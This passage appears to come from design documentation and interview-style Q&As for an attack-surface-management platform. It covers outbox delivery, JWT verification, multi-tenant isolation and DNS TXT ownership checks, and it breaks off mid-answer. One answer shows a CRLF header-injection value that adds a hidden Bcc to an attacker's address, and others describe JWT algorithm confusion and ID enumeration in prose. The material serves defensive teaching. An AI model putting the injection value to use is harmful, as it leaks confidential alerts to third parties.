  PostgreSQL guarantees that either both writes commit or neither does. A separate asynchronous delivery process reads the outbox table and dispatches messages to the SMTP relay. Even if the worker or server crashes, the pending notification rows remain safely persisted in PostgreSQL and will be processed immediately upon restart.

---

### Question 2: What is Email Header Injection (CRLF Injection), how can attack surface discovery data facilitate it, and how does Exposight defend against it?
**Answer:**
- **Email Header Injection (CRLF Injection):**
  The Internet Message Format (RFC 5322) and SMTP (RFC 5321) use Carriage Return and Line Feed (`\r\n` or `CRLF`) to separate header fields and delimit headers from the message body. If user input or external data is placed into an email header without sanitization, an attacker who can inject `\r\n` characters can inject arbitrary headers into the message.
- **Attack Surface Reconnaissance as an Attack Vector:**
  In an ASM tool, target domain names, subdomains, TLS Subject Alternative Names (SANs), and server header values are retrieved directly from external, untrusted sources (e.g., DNS records or HTTP responses). If an adversary configures a malicious DNS record or TLS certificate containing `evil.com\r\nBcc: spy@attacker.com`, a naive alert generator placing the domain into the email `Subject:` would inject the `Bcc:` header. The SMTP server would quietly blind-carbon-copy the attacker on all future attack surface vulnerability digests for that organization.
- **Exposight Defenses:**
  1. **Strict CRLF Stripping:** The `clean_header()` utility aggressively strips `\r` and `\n` characters from all header values (`Subject`, `From`, `To`).
  2. **API Input Validation:** The `PUT /domains/{id}/alerts` endpoint validates all email addresses using Pydantic's `EmailStr` and explicitly verifies that no email string contains `\r` or `\n`.
  3. **Body Plain-Text Sanitization:** All untrusted finding values inserted into the email body are passed through `clean_body_text()`, which strips control characters and truncates strings to 200 characters.

---

### Question 3: Discuss the architectural trade-offs between holding a database row lock during an outbound SMTP transmission versus decoupling delivery status into an external message queue. Why is a short socket timeout essential when adopting the former?
**Answer:**
- **Holding Row Lock During SMTP Send:**
  - *Trade-off (Resource Holding):* Holding a row lock (`FOR UPDATE`) keeps a database connection allocated from the connection pool while waiting for a remote network socket (the SMTP relay). If the remote server stalls, that database connection remains unavailable to other application tasks.
  - *Advantage (Simplicity & Zero Double-Sends):* It ensures strict, atomic mutual exclusion. No second worker can claim the row while transmission is active. If the transmission succeeds, `status = 'sent'` commits in the same transaction. If the worker crashes mid-transmission, the connection drops, PostgreSQL automatically rolls back the transaction, releases the lock, and leaves the row `pending` for recovery.
- **Decoupled Queue Alternative (e.g. RabbitMQ/SQS):**
  - *Advantage:* Highly scalable; workers do not hold database connections during network calls.
  - *Trade-off:* Introduces new infrastructure components, message broker failure modes, and requires distributed idempotency tokens to avoid duplicate sends.
- **Why a Strict Socket Timeout Is Non-Negotiable:**
  When holding a database lock during network I/O, an unbounded network socket could cause the database transaction to stay open for minutes or hours (e.g., during TCP half-open states or slowloris-style SMTP hangs). This would quickly exhaust the PostgreSQL connection pool and paralyze the entire SaaS application. Enforcing a strict **10-second socket timeout** on all connect, read, and write operations guarantees that a stalled SMTP server will never tie up database connections for more than 10 seconds.

---

### Question 4: In an automated vulnerability alerting system, what criteria should dictate alert triggering, and why must baseline scans, remediation changes, and summary changes be excluded from alert dispatches?
**Answer:**
- **Trigger Criteria:**
  Alerts must trigger **only** when all of the following conditions are simultaneously met:
  1. The domain has alerts explicitly enabled (`domain.alerts_enabled == True`).
  2. Change detection successfully executed (`change_detection.status == "computed"`).
  3. At least one change is categorized as an `"exposure"` (i.e. introduces a new attack surface risk).
  4. The exposure's severity meets or exceeds the domain's configured threshold (`severity >= alert_min_severity`).
- **Why Baseline Scans Must Not Alert:**
  The first succeeded scan for a domain establishes the historical baseline. It produces no differential changes (`status == "baseline"`). Dispatching an alert on a baseline scan would spam analysts with an inventory of pre-existing assets rather than newly discovered exposures.
- **Why Remediation Changes Must Not Alert:**
  Remediation events (e.g. a database port closing or a self-signed certificate being replaced with a valid CA cert) reduce organizational risk and are categorized with `INFO` severity. Firing high-priority security notifications for closed ports causes alert fatigue and clutters SOC triage queues.
- **Why Summary Changes Must Not Alert:**
  Summary changes (such as count differentials) provide statistical context in the dashboard but do not represent individual actionable vulnerabilities. Triggering alerts on count changes alone without specific asset exposures results in noisy, non-actionable emails.

---

### Question 5: How does at-least-once delivery semantics impact security operations centers (SOC), and how should alert notification schemas support idempotency and auditability?
**Answer:**
- **Impact of At-Least-Once Delivery on SOC Operations:**
  Because network partitions and worker crashes can occur after an email is accepted by an SMTP relay but before the database commits the `'sent'` status, outbox patterns operate under **at-least-once delivery semantics**. Occasionally, an analyst may receive a duplicate alert email following a crash recovery.
  In cybersecurity operations, at-least-once delivery is vastly preferred over at-most-once delivery: a duplicate alert costs an analyst a few seconds to dismiss, whereas a lost alert leaves an actively exploitable vulnerability unmonitored.
- **Idempotency & Auditability Schema Design:**
  To maintain auditability and mitigate duplicate confusion, the `alert_notifications` schema implements several critical controls:
  1. **Unique Constraint Per Scan Run & Recipient:**
     `uq_alert_notifications_run_recipient` on `(scan_run_id, recipient)` guarantees that even if change detection runs multiple times, only one outbox record can exist per recipient for a given scan run.
  2. **Immutable Message Body:** The complete rendered plain-text `body` is stored directly on the notification row. This provides an immutable audit log of exactly what was transmitted to the customer, enabling forensic verification in compliance audits (e.g. SOC 2 or ISO 27001).
  3. **State & Error Tracking:** Columns `attempts`, `max_attempts`, `last_error`, `next_attempt_at`, and `sent_at` provide real-time observability into delivery health, enabling administrators to diagnose SMTP configuration errors or network partitions via the API (`GET /domains/{id}/alert-notifications`).

---

# Part 10: v3.1a — Supabase JWT Authentication, JWKS Key Rotation & RBAC

## 1. Plain-English Code Walkthrough

### Authentication vs. Authorization
- **Authentication ("Who are you?"):**
  Identity verification is completely outsourced to Supabase Auth. The backend contains no user registration endpoints, no password hashing, no session cookies, and no credential databases. Supabase handles user login, password resets, OAuth, and email verification, issuing cryptographically signed JSON Web Tokens (JWTs).
- **Authorization ("What are you allowed to do?"):**
  While Supabase establishes identity, authorization is strictly our domain. Our backend parses the verified user identity (`sub`), queries our local `memberships` table, and evaluates fine-grained permissions across customer organizations and reconnaissance operations.
- **Email Verification Guardrail:**
  Because organization membership invitations and additions are conducted via email, the Supabase project must enforce "Confirm email". Trusting unverified emails from an identity provider would allow an attacker to register an account with a target's corporate email address and automatically claim organization access.

### JWKS Architecture & Key Rotation
- **Asymmetric Cryptography:**
  Tokens are signed with Supabase's private key and verified using public keys published on `{SUPABASE_URL}/auth/v1/.well-known/jwks.json`.
- **Decoupled Key Rotation:**
  Because public keys are indexed by a Key ID (`kid`), Supabase can rotate signing keys without requiring backend restarts or configuration redeployments.
- **Explicit Unknown-Kid Throttle:**
  If a token arrives with an unknown `kid`, the backend allows a single refresh from Supabase. To defend against attackers flooding the API with random `kid` values to trigger denial-of-service (DoS) against our backend or Supabase, our code explicitly enforces a 10-second minimum refresh interval. Requests during the throttle window fail immediately with 401.

### Algorithm Confusion Attacks & Defenses
- **The Vulnerability:**
  In a naive JWT library implementation that accepts both asymmetric (`RS256`/`ES256`) and symmetric (`HS256`) algorithms, an attacker can obtain the server's public key (which is publicly published on the JWKS endpoint) and sign a forged token using `HS256`, treating the public key PEM bytes as an HMAC secret. A vulnerable verifier looking up the public key would verify the HMAC signature and accept the forged claims (e.g. `sub: admin`).
- **Defensive Safeguards:**
  1. Strict algorithm allowlist: Only `ES256` and `RS256` are accepted.
  2. Symmetric algorithms (`HS256`, `HS384`, `HS512`) and unsigned tokens (`none`) are rejected upfront before cryptographic processing.
  3. Anonymous tokens (`is_anonymous: true`) are rejected with 401.

### Anti-Enumeration Defensive Pattern: 404 vs. 403
- **Information Leakage via 403:**
  In a multi-tenant platform, returning `403 Forbidden` when a user tries to access `/orgs/42/members` informs the attacker that Organization `42` exists. An attacker can iterate through IDs from 1 to 100,000 to map out valid organization IDs.
- **The 404 Guardrail:**
  `require_org_role` returns `404 Not Found` whenever a user does not have a membership in the target organization. A non-member cannot distinguish between an organization that does not exist and an organization they lack access to. `403 Forbidden` is reserved strictly for authenticated members who lack sufficient role privilege (e.g., a `viewer` trying to add a member).

### Last-Owner Invariant & Row Locking
- **The Race Hazard:**
  Suppose an organization has two owners, Alice and Bob. Both click "Demote to Viewer" at the exact same millisecond. If the system merely counts owners (`count == 2`) and updates, both transactions commit, leaving the organization with **zero owners**.
- **Row-Locking Solution:**
  Before counting owners, both `PATCH` and `DELETE` execute:
  `SELECT 1 FROM organizations WHERE id = :id FOR UPDATE;`
  This serializes the transactions on the organization row. The first transaction demotes one owner; the second transaction acquires the lock, recalculates remaining owners (`count == 0`), and is immediately rejected with `422 Unprocessable Entity`.

---

## 2. Five Step 3.1a Cybersecurity Interview Questions & Answers

### Question 1: Explain the JWT Algorithm Confusion attack, how asymmetric public keys are weaponized in it, and how an API must defend against it.
**Answer:**
- **The Mechanism:**
  JWTs support both asymmetric signature schemes (`RS256`/`ES256`, which require a private key to sign and a public key to verify) and symmetric HMAC schemes (`HS256`, which use the same shared secret for both signing and verification).
  In an algorithm confusion attack, an attacker takes an API configured to verify asymmetric tokens, forges a token with payload claims granting administrative privileges, and changes the header algorithm to `"alg": "HS256"`.
  The attacker then signs the token using the server's public key (e.g. retrieved from the public JWKS endpoint) as the HMAC secret.
- **The Vulnerability:**
  If the verification library accepts any algorithm specified in the token header and simply passes the configured public key into the verification function, the library interprets the public key as an HMAC secret key. Because the attacker signed the token using that exact public key, the HMAC verification succeeds!
- **Defensive Safeguards:**
  1. **Strict Algorithm Allowlist:** The application must explicitly restrict allowed algorithms to asymmetric algorithms only (`algorithms=["ES256", "RS256"]`). Any token specifying `HS256` or `none` is rejected immediately.
  2. **Never Trust the Header Algorithm:** The server must dictate acceptable verification algorithms rather than allowing the client-controlled `alg` header to determine the verification logic.

---

### Question 2: Why is outsourcing authentication to an external Identity Provider (like Supabase Auth) while retaining internal authorization considered best practice in modern SaaS architectures?
**Answer:**
- **Separation of Concerns:**
  Authentication answers *"Who is the user?"* while authorization answers *"What actions can this user perform on these resources?"*.
  Identity management involves high-risk, specialized security requirements: password hashing (Argon2/bcrypt), credential breach detection, rate limiting, Multi-Factor Authentication (MFA), password reset flows, session invalidation, and OAuth integrations. Handling this internally introduces significant attack surfaces and compliance burdens (SOC 2, ISO 27001).
- **Zero-Password Backend Architecture:**
  By delegating authentication to Supabase Auth, the Exposight backend never handles, hashes, or stores user passwords. The backend only validates short-lived, cryptographically signed JWTs using public keys (JWKS). Compromise of the application database exposes zero user credentials.
- **Internal Domain Ownership of Authorization:**
  Conversely, authorization depends directly on application business logic: organizations, workspace memberships, role tiers (`owner`, `admin`, `viewer`), and scan permissions. Outsourcing authorization to a third-party token provider leads to stale claim issues and complex claim synchronization. Retaining authorization in the application database guarantees real-time, ACID-compliant permission checks.

---

### Question 3: What is organizational ID enumeration, and why must multi-tenant authorization middleware return HTTP 404 rather than 403 to non-members?
**Answer:**
- **The Threat of ID Enumeration:**
  In a multi-tenant platform, resources are scoped to organizations identified by integer IDs (e.g. `/orgs/1`, `/orgs/2`).
  If the API returns `403 Forbidden` when an unauthorized user attempts to access an organization, the attacker learns that the organization exists. By writing a simple script iterating through IDs, an attacker can map out the entire organization directory, estimate platform customer volume, and identify high-value enterprise tenants.
- **The Anti-Enumeration Principle (404 vs 403):**
  To prevent information disclosure, the authorization dependency `require_org_role` returns `404 Not Found` whenever a user does not hold an active membership in the target organization.
  From the perspective of an external caller, an unauthorized organization is indistinguishable from a non-existent organization.
- **When 403 Is Legitimate:**
  `403 Forbidden` is returned only when the user's membership in that organization has already been confirmed, but their role lacks sufficient privilege for the requested action (e.g. a confirmed `viewer` attempting `POST /orgs/1/members`).

---

### Question 4: How does JWKS key caching introduce denial-of-service risks through unknown Key IDs (`kid`), and how should backends defend against cache-miss flooding?
**Answer:**
- **The Unknown-Kid Cache Stampede Attack:**
  In a JWKS architecture, the backend caches public keys indexed by their `kid` to avoid making HTTP requests to the Identity Provider on every API call.
  However, when the Identity Provider rotates keys, legitimate tokens will arrive with a new `kid` not yet in the cache. A naive implementation responds to an unknown `kid` by immediately fetching fresh keys from the JWKS endpoint.
  An attacker can exploit this by sending thousands of requests per second, each containing an invalid JWT with a randomized `kid` (`kid="random-uuid-1"`, `kid="random-uuid-2"`). The backend would execute an outbound HTTP request on every request, exhausting its connection pool, saturating network bandwidth, and triggering rate-limit bans from the JWKS provider.
- **Defensive Safeguards:**
  1. **Strict Throttled Refreshes:** The backend maintains an explicit minimum refresh interval (e.g. 10 seconds). If an unknown `kid` triggers a refresh, no further outbound HTTP calls are permitted until the window elapses.
  2. **Bounded HTTP Timeouts:** All JWKS network requests enforce strict, short timeouts (5.0 seconds).
  3. **Fast Rejection:** During the throttle window, unknown `kid` tokens are immediately rejected with `401 Unauthorized` without network I/O.

---

### Question 5: How does a pessimistic row lock (`SELECT ... FOR UPDATE`) solve the last-owner race condition in concurrent role management?
**Answer:**
- **The Last-Owner Invariant:**
  An organization must maintain at least one active owner to prevent orphaned organizations that cannot be administered or billed.
- **The Race Hazard:**
  Suppose an organization has two owners, Alice and Bob. Both simultaneously submit requests to demote each other or remove their own accounts.
  Under an un-fenced read-then-write sequence:
  1. Transaction A reads owner count: finds 2 owners $\rightarrow$ check passes.
  2. Transaction B reads owner count: finds 2 owners $\rightarrow$ check passes.
  3. Transaction A commits demotion $\rightarrow$ 1 owner remaining.
  4. Transaction B commits demotion $\rightarrow$ 0 owners remaining! The organization is permanently orphaned.
- **The Pessimistic Lock Solution:**
  Before evaluating the owner count, the transaction executes:
  `SELECT 1 FROM organizations WHERE id = :id FOR UPDATE;`
  PostgreSQL locks the parent organization row. Transaction A acquires the lock, counts owners, and demotes Bob. Transaction B is blocked at the database engine level until Transaction A commits.
  When Transaction B unblocks, it reads the updated state under the lock, sees that only 1 owner remains, and is aborted with `422 Unprocessable Entity`.

---

# Part 7: v3.1b — Multi-Tenant Isolation, Scoping Choke Points & Invariants

## 1. Plain-English Code Walkthrough

### Insecure Direct Object References (IDOR) & Attack Vectors
In a multi-tenant application, multiple customers (organizations) share the same underlying database and compute infrastructure. Without rigorous isolation, an attacker can access, modify, or delete another tenant's confidential reconnaissance data simply by manipulating IDs.
- **IDOR Vector 1 (Cross-Tenant Path Traversal):**
  An authenticated user of Org B tries to access Org A's endpoint path directly:
  `GET /orgs/<Org_A_ID>/domains` or `GET /orgs/<Org_A_ID>/scans/<Scan_A_ID>`.
  *Defense:* Handled at the HTTP perimeter by `require_org_role`. The dependency extracts `org_id` from the URL path and queries `memberships` for `(org_id, current_user.id)`. If no active membership exists, the request is immediately aborted with `404 Not Found`.
- **IDOR Vector 2 (ID Swapping / Parameter Pollution):**
  An attacker belonging to Org B requests an endpoint under Org B's valid path, but substitutes an object ID that belongs to Org A:
  `GET /orgs/<Org_B_ID>/scans/<Scan_A_ID>` or `PUT /orgs/<Org_B_ID>/domains/<Domain_A_ID>/schedule`.
  *Defense:* Handled at the database query choke points (`get_domain_for_org` and `get_scan_for_org`). The SQL query itself enforces tenant scoping (`WHERE id = :id AND org_id = :org_id`). If the resource belongs to another organization, 0 rows match, and the helper raises `404 Not Found`.

### The Single Choke Point Architectural Pattern
Relying on individual route handlers to manually inspect and compare tenant IDs is fragile and prone to developer omissions. Exposight centralizes all resource retrieval through dedicated scoping helpers in `src/asm/api/deps.py`:
- `get_domain_for_org(db, org_id, domain_id) -> Domain`:
  ```sql
  SELECT * FROM domains
  WHERE id = :domain_id AND org_id = :org_id;
  ```
- `get_scan_for_org(db, org_id, scan_id) -> ScanRun`:
  ```sql
  SELECT scan_runs.* FROM scan_runs
  JOIN domains ON domains.id = scan_runs.domain_id
  WHERE scan_runs.id = :scan_id AND domains.org_id = :org_id;
  ```
Because filtering occurs directly in the database engine query:
1. Data belonging to other tenants is never transferred from PostgreSQL to application memory.
2. If an object does not exist or belongs to another tenant, the result is identical: `404 Not Found`.

### Why Child Tables Do Not Get a Separate `org_id`
Child entities (`scan_runs`, `scan_stages`, `scan_results`, `scan_changes`, `alert_notifications`) are scoped strictly through foreign keys to `domains` (`domain_id`).
- **Normalized Data Integrity (3NF):** A scan, change, or alert notification cannot logically exist independently of a domain. Adding `org_id` to child tables creates data denormalization.
- **Elimination of Conflicting Tenant IDs:** If `scan_runs` had both `domain_id` and `org_id`, it would be possible for bugs or race conditions to create a record where `scan_runs.org_id != domains.org_id`, introducing catastrophic data leakage and authorization ambiguity.
- **Relational Cascades:** Cascading foreign keys (`ON DELETE CASCADE`) from `organizations -> domains -> scan_runs -> stages/results/changes/alerts` guarantee that removing a domain or organization cleanly and atomically wipes all associated child telemetry.

### Per-Organization Domain Uniqueness vs. Global Uniqueness
- In single-tenant systems, domain names are typically enforced globally (`UNIQUE(name)`).
- In a multi-tenant ASM platform, global uniqueness introduces a critical information disclosure vulnerability:
  If Org A monitors `internal-target.corp` and Org B attempts to add `internal-target.corp`, a global unique constraint would reject Org B's request with `409 Conflict`. Org B would learn that another competitor or organization on the platform is actively targeting or monitoring `internal-target.corp`!
- **Solution:** The global unique index was dropped and replaced by a composite unique constraint:
  `UNIQUE (org_id, name)`.
  Multiple organizations can independently monitor the same domain without learning about each other's reconnaissance targets. Duplicate registrations within the *same* organization are still prevented with `409 Conflict`.

### The 404 Anti-Enumeration Principle
Whenever a resource is missing or belongs to a foreign organization, the API consistently returns `404 Not Found`.
If the API returned `403 Forbidden` for existing foreign resources and `404 Not Found` for nonexistent resources:
An attacker could enumerate resource IDs (`1, 2, 3...`) to distinguish which IDs correspond to real customers on the platform, violating multi-tenant confidentiality. Returning `404` for both states ensures foreign resources are indistinguishable from non-existent resources.

### Safe Migration & Legacy Quarantine Pattern
When introducing mandatory multi-tenancy (`domains.org_id NOT NULL`) to an existing database with pre-existing domains:
1. **Never Identify by Name:** User input can create organizations named "Legacy" or "Quarantine". Migration logic must never rely on string names (`name = 'Legacy'`).
2. **Deterministic System Metadata:** Added `organizations.system_kind` (nullable string, indexed). The migration script creates a quarantine organization with `system_kind = 'legacy_quarantine'`, zero members, and reassigns all legacy domains to it.
3. **Fail-Closed API:** The `POST /orgs` endpoint rejects any client attempt to set `system_kind`.
4. **Controlled Migration CLI (`move-domain`):** Administrators can move domains out of quarantine into customer organizations via `asm admin move-domain <domain_id> <target_org_id>`, with strict validation: refuses any source org where `system_kind != 'legacy_quarantine'`, refuses nonexistent targets, and prevents name collisions in the target organization.

---

## 2. Five Step 3.1b Cybersecurity Interview Questions & Answers

### Question 1: What is an Insecure Direct Object Reference (IDOR), how do the two primary vectors (path manipulation vs. ID parameter swapping) differ, and how does SQL-level filtering eliminate them?
**Answer:**
- **Definition:**
  An Insecure Direct Object Reference (IDOR) is an access control vulnerability (OWASP Top 10 Broken Access Control) that occurs when an application uses client-supplied input to directly access an underlying database object without validating whether the authenticated user has authorization to access that specific object.
- **The Two Primary Vectors:**
  1. *Vector 1 (Path Manipulation / Cross-Tenant Traversal):* An attacker alters the organization identifier in the URL path (e.g. changing `/orgs/1/domains` to `/orgs/2/domains`). If the application verifies that the user is logged in but fails to verify their membership in Organization 2, the attacker gains access to Organization 2's data.
  2. *Vector 2 (Parameter Swapping / ID Inversion):* An attacker uses their own legitimate organization path (where they are an authorized member), but requests a resource ID belonging to another organization (e.g. `GET /orgs/1/domains/99`, where domain 99 belongs to Organization 2). If the application checks only that the user belongs to Organization 1 and separately queries `Domain.get(99)` without binding the two, cross-tenant data is leaked.
- **SQL-Level Elimination:**
  Eliminating IDOR requires binding the organization identity and the resource identity into the same atomic database query:
  `SELECT * FROM domains WHERE id = :domain_id AND org_id = :org_id;`
  By filtering in SQL, the database engine enforces isolation before records ever leave the storage layer. If a user queries a foreign ID under their organization, the query returns zero rows, completely neutralizing ID parameter swapping.

---

### Question 2: Why should domain uniqueness in a multi-tenant ASM platform be scoped per-organization `(org_id, name)` rather than globally across the database? What threat vector does global uniqueness expose?
**Answer:**
- **The Information Leakage Vector (Tenant Cross-Reconnaissance):**
  If `domains.name` is enforced with a global unique constraint, only one tenant can register any given domain name.
  Suppose Organization A (a sensitive financial institution or defense contractor) is monitoring `stealth-acquisition-target.com` or `internal-sub.corp`.
  When Organization B (a competitor or malicious actor) attempts to register `stealth-acquisition-target.com`, the API would return `409 Conflict: Domain already registered`.
  This response leaks critical business and operational intelligence: it proves to Organization B that another customer on the platform is actively monitoring or targeting that specific domain. Attackers could feed lists of high-profile domains, competitors, or target companies into the API to map out which assets other tenants are investigating.
- **The Defense:**
  By dropping the global unique constraint and replacing it with a composite unique constraint `UNIQUE (org_id, name)`:
  1. Organization A and Organization B can both independently register and scan `example.com`.
  2. Neither organization is aware that the other is monitoring the same asset.
  3. Scans, stage reports, change detections, and alert digests remain strictly isolated within each tenant's boundary.
  4. Duplicate registrations within the same organization are still prevented with `409 Conflict`.

---

### Question 3: Explain the Anti-Enumeration Principle in multi-tenant authorization: why must the API return HTTP 404 rather than HTTP 403 when an authenticated user attempts to access an object belonging to a foreign tenant?
**Answer:**
- **Status Code Semantics:**
  - `403 Forbidden`: *"I know who you are, I found the resource you asked for, but you do not have permission to access it."*
  - `404 Not Found`: *"The requested resource does not exist."*
- **The Enumeration Attack:**
  If an API returns `403 Forbidden` when User B requests Resource A (which belongs to Tenant A) and returns `404 Not Found` when requesting Resource C (which does not exist):
  An attacker can write a sequential loop probing IDs `1..100,000`. Every ID that yields `403` confirms the presence of an active customer resource in another tenant's account. This reveals:
  1. The total volume and ID distribution of resources across all tenants.
  2. The rate of new resource creation on the platform.
  3. Specific resource identifiers that can be targeted in subsequent exploit attempts or social engineering.
- **The Anti-Enumeration Principle:**
  In multi-tenant security architecture, a resource that does not belong to the caller's authorized context **must appear not to exist at all**. Returning `404 Not Found` for both non-existent resources and unauthorized foreign resources preserves strict confidentiality and prevents resource existence leakage.

---

### Question 4: In relational database multi-tenancy, why is child-table scoping through foreign keys (normal form) preferred over adding `org_id` to every child table? What risks does denormalizing `org_id` introduce?
**Answer:**
- **Relational Consistency and 3NF:**
  In a well-designed schema, child records (`scan_runs`, `scan_stages`, `scan_results`, `scan_changes`, `alert_notifications`) represent telemetry and workflow state belonging to a parent `domain`. They have no meaning without their domain. Normalization dictates that each fact is stored in one place.
- **The Risks of Denormalizing `org_id` Across Child Tables:**
  1. *Conflicting Tenant Attribution:* If `scan_runs` has both `domain_id` and `org_id`, a software defect, race condition, or faulty migration could write a row where `scan_runs.org_id = 2` while `domains.org_id = 1`. This split-brain attribution creates severe security vulnerabilities: which tenant owns the scan? Does a user of Org 2 see Org 1's scan results?
  2. *Redundant Storage & Index Overhead:* Duplicating `org_id` on high-volume tables (e.g. millions of `scan_results` or `scan_changes` rows) significantly inflates storage consumption, cache footprint, and index maintenance costs.
  3. *Update Anomalies:* If an admin moves a domain to another organization (e.g. during an acquisition or quarantine recovery), an engine with denormalized `org_id` must update millions of child rows across 6 tables within an expensive transaction, risking lock timeouts and partial updates. With normalized foreign keys, updating `domains.org_id` instantly and atomically re-scopes all child records.
- **Implementation:**
  Child entities are scoped securely via `JOIN domains ON domains.id = scan_runs.domain_id WHERE domains.org_id = :org_id`.

---

### Question 5: When performing database migrations with zero-downtime requirements and historical unassigned data, how does the "Quarantine Tenant" pattern with deterministic system flags (`system_kind`) prevent data leakage and race conditions?
**Answer:**
- **The Problem of Legacy Data During Breaking Multi-Tenant Migrations:**
  When migrating a single-tenant database to multi-tenancy, `domains.org_id` must transition from nullable to `NOT NULL`. If existing domains are assigned to a newly created regular customer organization, or if a default organization is assigned members, historical customer data might become instantly visible to arbitrary users.
- **The Quarantine Tenant Pattern:**
  1. *Zero-Member Isolation:* The migration creates a designated "Legacy Quarantine" organization that has **zero memberships**. Because no user belongs to it, no API request can ever access, view, or scan its domains.
  2. *Deterministic Identification via `system_kind`:* Rather than identifying the quarantine tenant by a mutable or user-controlled string (such as `name = 'Legacy'`, which a customer could have legitimately registered), the organization schema includes a dedicated `system_kind` column. The migration sets `system_kind = 'legacy_quarantine'`.
  3. *Client-Proof Immutability:* API endpoint schemas (`OrgCreate`) omit `system_kind`, preventing users from creating or manipulating system-designated organizations.
  4. *Controlled Administrative Triage:* A dedicated administrative CLI tool (`asm admin move-domain`) validates that a domain's current owner is strictly `system_kind = 'legacy_quarantine'` before allowing it to be safely reassigned to an active customer organization. This prevents operators from accidentally moving active customer domains between tenants.

---

# Part 6: v3.2 — Domain Ownership Verification via DNS TXT

## 1. Plain-English Architecture & Design Walkthrough

### Why Domain Ownership Verification?
In earlier versions of `asm`, authorization was client-asserted: the client passed `--authorized` on the command line or submitted a domain with an arbitrary authorization flag.
In a multi-tenant SaaS environment, self-asserted authorization is an unacceptable security failure:
1. **Hostile Targeting / Denial-of-Service:** Any tenant could submit a target domain belonging to a competitor, bank, or government agency, using the SaaS platform's IP addresses and computing resources as a proxy for unsolicited probing, port scanning, or banner grabbing.
2. **Platform Blacklisting:** Unsolicited active reconnaissance will trigger target intrusion detection systems (IDS/IPS), resulting in the platform's worker nodes being blocklisted or abuse complaints being filed with hosting providers.
3. **Objective Proof of Control:** To legally and defensibly scan a domain, the platform must demand objective proof that the requesting organization exercises administrative control over the domain's authoritative namespace before any network packets or scan jobs are scheduled.

### Legal and Regulatory Context

> [!IMPORTANT]
> **Legal Notice & Disclaimer:** Statutory computer crime frameworks vary significantly by jurisdiction, nation, and state. The descriptions below provide technical and operational context and explicitly **do not constitute legal advice**. Organizations operating security tools must consult qualified legal counsel regarding compliance with local cyber statutes and acceptable use policies.

- **United States — Computer Fraud and Abuse Act (CFAA, 18 U.S.C. § 1030):**
  The CFAA prohibits intentionally accessing a "protected computer" without authorization or exceeding authorized access. While passive reconnaissance (such as querying public Certificate Transparency logs) is generally permitted, active reconnaissance—such as TCP connect port scanning, service banner grabbing, and HTTP path inspection—directly contacts target servers without authorization. If performed against systems without permission, it risks civil and criminal liability.
- **India — Information Technology Act, 2000 (IT Act):**
  - *Section 43 (Penalty and compensation for damage to computer systems):* Imposes liability for unauthorized access, downloading or extracting data, introducing contaminants, or disrupting services without permission of the owner or person in charge of the computer system.
  - *Section 66 (Computer-related offenses):* Classifies dishonest or fraudulent acts referred to in Section 43 as criminal offenses punishable with imprisonment and fines.
- **Proof of DNS Control as Authorization Defense:**
  By requiring the owner to create an out-of-band DNS TXT record matching a cryptographically random, secret token generated by the SaaS platform, the system establishes a strong, verifiable audit trail demonstrating that someone with administrative zone management credentials authorized the platform to perform security evaluations.

### Why a TXT Record on a Dedicated Label (`_asm-verify.<domain>`)?
1. **Proof of DNS Control, Not Cryptographic Proof:**
   DNS TXT verification provides **proof of DNS control** (administrative write access to the domain's authoritative zone file). It is **never** referred to as "cryptographic proof" because standard DNS queries are unencrypted and unauthenticated unless DNSSEC is explicitly validated.
2. **Dedicated Label (`_asm-verify.<domain>`):**
   Publishing verification tokens at a designated label rather than the zone apex (`example.com`) provides key benefits:
   - **Apex Cleanliness:** Apex records are often congested with SPF (`v=spf1 ...`), DMARC (`_dmarc`), and verification records for various SaaS vendors (Google Workspace, Microsoft 365, GitHub, Stripe).
   - **Collision Prevention:** Avoids conflicts where multiple TXT records might exceed maximum DNS UDP packet sizes (512 bytes) or EDNS buffer limits, triggering fallback to TCP.
   - **Delegation Flexibility:** Zone administrators can delegate `_asm-verify.<domain>` to a dedicated subdomain or team without giving them write access to the root zone.
3. **RFC 1035 Multi-String TXT Record Handling:**
   RFC 1035 limits individual character strings within a DNS TXT resource record to 255 octets. Long TXT records are often split by DNS servers into multiple quoted strings (e.g. `"asm-verify=" "dGhpcy1pcy1hLXNhbXBsZS..."`).
   A naive parser that checks only the first string would fail. The verification engine decodes and concatenates all text chunks within each TXT record into a unified string before checking for exact match with `asm-verify=<token>`.

### Continuous Re-Verification & Lapsing Logic
Domain ownership is not a one-time event:
- Domains expire and are bought by third parties or dropped into redemption periods.
- Companies divest subsidiaries or cancel cloud DNS services.
- Internal IT teams rotate or delete DNS records during migrations.

To ensure ongoing legitimacy:
1. **Worker Background Polling:** The worker re-checks verified domains once every ~24 hours (with randomized jitter).
2. **"Unknown" vs "Absent" Failure Modes:**
   - `MATCH`: Verification confirmed.
   - `ABSENT`: Definite negative response. Authoritative nameservers replied definitively that the domain does not exist (`NXDOMAIN`) or responsive nameservers returned no matching TXT record.
   - `UNKNOWN`: Transient network failure. DNS query timeout, `SERVFAIL`, or network drop.
   **Crucial Rule:** `UNKNOWN` results **never** count toward lapses. They reflect transient internet infrastructure noise, not loss of domain control.
3. **Two-Miss Lapsing Rule with Fast Retry:**
   A domain transitions from `verified` to `lapsed` **only after 2 consecutive definite misses**.
   - Upon the 1st definite miss: `consecutive_misses` is set to 1, status remains `verified`, and a fast retry is scheduled in **1 hour** (`next_reverification_at = now() + 1h`).
   - Upon the 2nd consecutive definite miss: `consecutive_misses` reaches 2, status becomes `lapsed`, and continuous monitoring is paused.
4. **Lapses are Never Silent (Outbox Alerts):**
   When a domain lapses, an alert notification is atomically inserted into the transactional outbox:
   `"Domain verification lapsed: monitoring paused"`.
   Domain administrators receive immediate notice that security scans have stopped due to missing verification records.

### Operator Overrides (Time-Bounded Break-Glass)
In enterprise scenarios, corporate change windows for public DNS can take weeks, or internal staging domains might be air-gapped.
Platform operators can grant emergency overrides:
- `asm admin verify-domain --domain-id X --reason "<text>" --expires-in-days <1-90>`
- **Safety Invariants:**
  1. `--reason` is strictly required and non-empty.
  2. Overrides have a mandatory, finite expiration (`verification_expires_at`), defaulting to 30 days and capped at 90 days.
  3. Worker automatically resets expired overrides to `pending` and dispatches an outbox alert.
  4. Operators can revoke overrides at any time using `asm admin revoke-verification --domain-id X --reason "<text>"`.

---

## 2. Five Domain Ownership Verification Interview Questions & Answers

### Question 1: Why is a DNS TXT record described as "proof of DNS control" rather than "cryptographic proof"? What security guarantees does it actually provide?
**Answer:**
- **Why Not Cryptographic Proof:**
